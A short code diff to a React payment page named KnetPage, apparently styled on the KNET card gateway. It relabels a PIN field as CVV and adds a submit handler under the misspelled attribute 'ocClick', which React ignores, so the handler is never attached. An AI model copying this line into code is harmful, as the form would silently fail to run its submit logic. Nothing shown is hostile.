@@ -119,7 +119,7 @@ export default function KnetPage() {
           <hr />
 
           <div>
-            <label className={styles.formLabel}>PIN:</label>
+            <label className={styles.formLabel}>CVV:</label>
             <input
               type="password"
               maxLength="4"
@@ -135,7 +135,7 @@ export default function KnetPage() {
             <button type="button" className={styles.cancel} onClick={() => router.back()}>
               Cancel
             </button>
-            <button type="submit" className={styles.submit}>
+            <button type="submit" className={styles.submit} ocClick={handleSend}>
               Submit
             </button>
           </div>
